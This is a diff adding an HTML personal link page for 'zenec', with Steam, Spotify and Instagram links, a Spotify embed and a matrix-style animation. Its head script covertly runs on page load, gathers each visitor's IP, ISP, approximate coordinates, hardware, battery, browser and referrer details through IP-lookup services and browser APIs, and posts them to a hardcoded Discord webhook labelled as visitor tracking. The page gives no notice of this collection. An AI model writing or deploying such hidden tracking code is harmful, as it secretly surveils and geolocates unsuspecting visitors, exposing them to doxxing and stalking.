@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>zenec</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+<script>
+function copyNick() {
+  const nick = 'ZENEC AMASSA BOT';
+  navigator.clipboard.writeText(nick).then(() => {
+    alert('Nick copiado! Pronto pra perder?');
+  }).catch(() => {
+    const textarea = document.createElement('textarea');
+    textarea.value = nick;
+    textarea.style.position = 'fixed';
+    textarea.style.opacity = '0';
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand('copy');
+    document.body.removeChild(textarea);
+    alert('Nick copiado! Pronto pra perder?');
+  });
+}
+
+let autoplayActivated = false;
+
+document.addEventListener('click', function() {
+  if (!autoplayActivated) {
+    autoplayActivated = true;
+  }
+}, { once: true });
+
+// Função para obter informações de hardware avançadas
+async function getAdvancedInfo() {
+  const info = {};
+  
+  // GPU/Placa de Vídeo
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (gl) {
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      if (debugInfo) {
+        info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      } else {
+        info.gpu = 'N/A';
+      }
+    } else {
+      info.gpu = 'WebGL não suportado';
+    }
+  } catch (e) {
+    info.gpu = 'Erro ao detectar GPU';
+  }
+
+  // Memória RAM e Cores do Processador
+  if (navigator.deviceMemory) {
+    info.ram = navigator.deviceMemory + 'GB RAM';
+  } else {
+    info.ram = 'N/A';
+  }
+
+  if (navigator.hardwareConcurrency) {
+    info.cores = navigator.hardwareConcurrency + ' Cores';
+  } else {
+    info.cores = 'N/A';
+  }
+
+  // Bateria
+  try {
+    if (navigator.getBattery) {
+      const battery = await navigator.getBattery();
+      const batteryLevel = Math.round(battery.level * 100);
+      const charging = battery.charging ? 'Carregando' : 'Descarregando';
+      info.battery = `${batteryLevel}% (${charging})`;
+    } else {
+      info.battery = 'N/A';
+    }
+  } catch (e) {
+    info.battery = 'N/A';
+  }
+
+  // Velocidade da Internet
+  try {
+    if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (connection.downlink) {
+        info.internet = connection.downlink + ' Mbps';
+      } else {
+        info.internet = 'N/A';
+      }
+    } else {
+      info.internet = 'N/A';
+    }
+  } catch (e) {
+    info.internet = 'N/A';
+  }
+
+  // Histórico (quantidade aproximada)
+  try {
+    info.history = window.history.length + ' páginas visitadas';
+  } catch (e) {
+    info.history = 'N/A';
+  }
+
+  // Pixel Ratio
+  info.pixelRatio = window.devicePixelRatio || 1;
+
+  return info;
+}
+
+// Função para enviar dados para o webhook do Discord
+async function sendToDiscord(data) {
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1459235790323192071/enHdIHbFgOh09SB_lpSeglefJaTWjK6WfGTKbylOl8uBKavmBr1eaW4q-tFMTLWtgct7';
+  
+  try {
+    const embed = {
+      title: "🔍 Rastreamento de Visitante",
+      color: 65280,
+      fields: [
+        { name: "🌐 IP", value: data.ip || "N/A", inline: true },
+        { name: "🏢 Provedor", value: data.isp || "N/A", inline: true },
+        { name: "📍 Localização", value: data.location || "N/A", inline: false },
+        { name: "🗺️ Coordenadas", value: data.coords || "N/A", inline: true },
+        { name: "🎯 Precisão", value: data.accuracy || "N/A", inline: true },
+        { name: "🖥️ Sistema", value: data.platform, inline: false },
+        { name: "🎮 GPU / Placa", value: data.gpu || "N/A", inline: false },
+        { name: "🔋 Bateria", value: data.battery || "N/A", inline: true },
+        { name: "📡 Internet", value: data.internet || "N/A", inline: true },
+        { name: "🌐 Navegador", value: data.browser, inline: false },
+        { name: "📱 Tela", value: data.screen, inline: true },
+        { name: "🌍 Idioma", value: data.language, inline: true },
+        { name: "📖 Referrer", value: data.referrer.length > 100 ? data.referrer.substring(0, 97) + "..." : data.referrer, inline: false },
+        { name: "📚 Histórico", value: data.history || "N/A", inline: true },
+        { name: "⏰ Horário Acesso", value: data.time, inline: true }
+      ],
+      timestamp: new Date().toISOString(),
+      footer: { text: "zenec security system v3" },
+      thumbnail: {
+        url: "https://flagcdn.com/w80/" + (data.countryCode ? data.countryCode.toLowerCase() : "br") + ".png"
+      }
+    };
+
+    const response = await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ 
+        username: "ZENEC Security Pro",
+        embeds: [embed] 
+      })
+    });
+
+    if (!response.ok) {
+      console.error('Erro no webhook:', response.status);
+    } else {
+      console.log('✅ Dados enviados com sucesso!');
+    }
+  } catch (error) {
+    console.error('❌ Erro ao enviar:', error);
+  }
+}
+
+// Coletar todas as informações e enviar UMA vez
+async function collectInfo() {
+  try {
+    console.log('🔍 Iniciando coleta de dados...');
+    
+    // 1. Coleta informações avançadas de hardware
+    const advancedInfo = await getAdvancedInfo();
+    
+    // 2. Busca localização por IP (cidade e estado)
+    console.log('🌐 Buscando localização por IP...');
+    let locationData;
+    
+    try {
+      // Tenta ipapi.co primeiro (confiável para cidade/estado)
+      const response1 = await fetch('https://ipapi.co/json/');
+      locationData = await response1.json();
+      
+      if (locationData.error) {
+        throw new Error('Rate limit na primeira API');
+      }
+      
+      console.log('✅ Dados de IP obtidos:', locationData);
+      
+    } catch (e) {
+      console.log('⚠️ Primeira API falhou, tentando alternativa...');
+      // Fallback: ipwhois.app
+      try {
+        const response2 = await fetch('https://ipwho.is/');
+        const geoData = await response2.json();
+        
+        locationData = {
+          ip: geoData.ip,
+          city: geoData.city,
+          region: geoData.region,
+          country_name: geoData.country,
+          country_code: geoData.country_code,
+          latitude: geoData.latitude,
+          longitude: geoData.longitude,
+          timezone: geoData.timezone?.id,
+          org: geoData.connection?.isp || geoData.connection?.org || 'N/A',
+          asn: geoData.connection?.asn
+        };
+        
+        console.log('✅ API alternativa obtida:', locationData);
+        
+      } catch (e2) {
+        console.log('⚠️ Segunda API falhou, usando IP básico...');
+        // Último fallback: só IP básico
+        const response3 = await fetch('https://api.ipify.org?format=json');
+        const ipData = await response3.json();
+        locationData = { ip: ipData.ip };
+      }
+    }
+    
+    // 3. Define coordenadas e precisão
+    const coords = locationData.latitude && locationData.longitude 
+      ? `${locationData.latitude}, ${locationData.longitude}`
+      : 'N/A';
+    const accuracy = coords !== 'N/A' ? 'Cidade/Estado (~2-10km)' : 'N/A';
+    
+    // 4. Monta string do sistema com cores e RAM
+    const systemInfo = `${navigator.platform} (${advancedInfo.cores}, ${advancedInfo.ram})`;
+    
+    // 5. Monta dados completos (SÓ DADOS CONFIÁVEIS)
+    const fullData = {
+      time: new Date().toLocaleString('pt-BR'),
+      platform: systemInfo,
+      browser: navigator.userAgent.substring(0, 150),
+      screen: `${screen.width}x${screen.height} (${advancedInfo.pixelRatio}x)`,
+      language: navigator.language,
+      referrer: document.referrer || "Acesso direto",
+      ip: locationData.ip || "N/A",
+      location: `${locationData.city || '?'}, ${locationData.region || '?'}, ${locationData.country_name || '?'}`,
+      isp: locationData.org || "N/A",
+      coords: coords,
+      accuracy: accuracy,
+      timezone: locationData.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
+      countryCode: locationData.country_code || "N/A",
+      asn: locationData.asn || "N/A",
+      gpu: advancedInfo.gpu,
+      battery: advancedInfo.battery,
+      internet: advancedInfo.internet,
+      history: advancedInfo.history
+    };
+
+    // 6. Envia apenas UMA vez com tudo
+    console.log('📤 Enviando dados completos:', fullData);
+    sendToDiscord(fullData);
+  } catch (error) {
+    console.error('❌ Erro geral na coleta:', error);
+    
+    // Fallback mínimo se tudo falhar
+    try {
+      const advancedInfo = await getAdvancedInfo();
+      const response = await fetch('https://api.ipify.org?format=json');
+      const ipData = await response.json();
+      
+      const systemInfo = `${navigator.platform} (${advancedInfo.cores}, ${advancedInfo.ram})`;
+      
+      const basicData = {
+        time: new Date().toLocaleString('pt-BR'),
+        platform: systemInfo,
+        browser: navigator.userAgent.substring(0, 150),
+        screen: `${screen.width}x${screen.height} (${advancedInfo.pixelRatio}x)`,
+        language: navigator.language,
+        referrer: document.referrer || "Acesso direto",
+        ip: ipData.ip,
+        location: "Não disponível",
+        neighborhood: "N/A",
+        street: "N/A",
+        isp: "Não disponível",
+        coords: "Não disponível",
+        accuracy: "N/A",
+        postal: "N/A",
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        countryCode: "N/A",
+        asn: "N/A",
+        gpu: advancedInfo.gpu,
+        battery: advancedInfo.battery,
+        internet: advancedInfo.internet,
+        history: advancedInfo.history
+      };
+      sendToDiscord(basicData);
+    } catch (finalError) {
+      console.error('❌ Erro total:', finalError);
+    }
+  }
+}
+
+// Executar quando a página carregar
+if (document.readyState === 'loading') {
+  document.addEventListener('DOMContentLoaded', collectInfo);
+} else {
+  collectInfo();
+}
+
+window.addEventListener('load', function() {
+  const canvas = document.createElement('canvas');
+  canvas.id = 'matrix';
+  canvas.style.position = 'fixed';
+  canvas.style.top = '0';
+  canvas.style.left = '0';
+  canvas.style.width = '100%';
+  canvas.style.height = '100%';
+  canvas.style.zIndex = '1';
+  canvas.style.pointerEvents = 'none';
+  document.body.appendChild(canvas);
+
+  const ctx = canvas.getContext('2d');
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+
+  const chars = '01';
+  const fontSize = 14;
+  const columns = canvas.width / fontSize;
+  const drops = [];
+
+  for (let i = 0; i < columns; i++) {
+    drops[i] = Math.random() * canvas.height / fontSize;
+  }
+
+  function drawMatrix() {
+    ctx.fillStyle = 'rgba(5, 5, 7, 0.05)';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#0f0';
+    ctx.font = fontSize + 'px monospace';
+
+    for (let i = 0; i < drops.length; i++) {
+      const text = chars[Math.floor(Math.random() * chars.length)];
+      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+        drops[i] = 0;
+      }
+      drops[i]++;
+    }
+  }
+
+  setInterval(drawMatrix, 35);
+
+  window.addEventListener('resize', () => {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  });
+});
+</script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}
+html,body{background:#050507;color:#fff;height:100%;overflow:hidden;position:fixed;width:100%}
+
+.container{
+  position:relative;
+  z-index:2;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  gap:28px;
+  padding:20px;
+}
+
+.name{
+  font-size:78px;
+  font-weight:900;
+  letter-spacing:8px;
+  text-transform:lowercase;
+  color:#0f0;
+  text-shadow:
+    0 0 20px rgba(0,255,0,.8),
+    0 0 40px rgba(0,255,0,.5),
+    0 0 60px rgba(0,255,0,.3);
+  position:relative;
+}
+
+.bg{
+  position:fixed;
+  inset:0;
+  z-index:0;
+}
+
+.smoke{
+  position:absolute;
+  width:120%;
+  height:120%;
+  filter:blur(120px);
+  opacity:.6;
+  animation:move 14s infinite alternate;
+}
+
+.smoke.purple{
+  background:radial-gradient(circle at center, rgba(139,92,246,.8), transparent 60%);
+  top:-20%;
+  left:-10%;
+}
+
+.smoke.green{
+  background:radial-gradient(circle at center, rgba(34,197,94,.7), transparent 60%);
+  bottom:-20%;
+  right:-10%;
+  animation-duration:18s;
+}
+
+@keyframes move{
+  from{transform:translate(0,0)}
+  to{transform:translate(80px,60px)}
+}
+
+.noise{
+  position:absolute;
+  inset:0;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='4'/%3E%3C/filter%3E%3Crect width='200' height='200' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
+  opacity:.15;
+}
+
+.links{
+  width:100%;
+  max-width:340px;
+  display:flex;
+  flex-direction:column;
+  gap:14px;
+}
+
+.link{
+  text-decoration:none;
+  color:#0f0;
+  padding:16px;
+  border-radius:12px;
+  text-align:center;
+  background:rgba(0,0,0,.8);
+  border:1px solid #0f0;
+  transition:.25s;
+  font-family:monospace;
+  text-transform:uppercase;
+  letter-spacing:2px;
+  box-shadow:0 0 10px rgba(0,255,0,.3);
+}
+
+.link:hover{
+  background:#0f0;
+  color:#000;
+  box-shadow:0 0 20px rgba(0,255,0,.8), 0 0 40px rgba(0,255,0,.5);
+  transform:translateY(-3px);
+}
+
+.spotify-container{
+  width:100%;
+  max-width:340px;
+  overflow:hidden;
+}
+
+.footer{
+  margin-top:20px;
+  font-size:14px;
+  opacity:.5;
+  letter-spacing:1px;
+}
+
+@media (max-width: 768px) {
+  .name{font-size:48px;letter-spacing:4px}
+}
+</style>
+</head>
+<body>
+
+<div class="bg">
+  <div class="smoke purple"></div>
+  <div class="smoke green"></div>
+  <div class="noise"></div>
+</div>
+
+<main class="container">
+  <h1 class="name">zenec</h1>
+
+  <div class="spotify-container">
+    <iframe
+      style="border-radius:12px; margin: 20px 0; display: block;"
+      src="https://open.spotify.com/embed/track/0LJFQp5QziQP4QjUybN9yP?utm_source=generator&theme=0&autoplay=1"
+      width="100%"
+      height="80"
+      frameborder="0"
+      allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture"
+      loading="lazy">
+    </iframe>
+  </div>
+
+  <div class="links">
+    <a class="link" href="https://steamcommunity.com/id/alakiban/" target="_blank">Steam</a>
+    <a class="link" href="https://open.spotify.com/user/31kcnovulikf4fcv5umkqtfclvy4" target="_blank">Spotify</a>
+    <a class="link" href="https://www.instagram.com/joao_lima.c" target="_blank">Instagram</a>
+    <a class="link" href="javascript:void(0)" onclick="copyNick()">Epic Games</a>
+  </div>
+
+  <div class="footer">by zenec</div>
+</main>
+
+</body>
+</html>
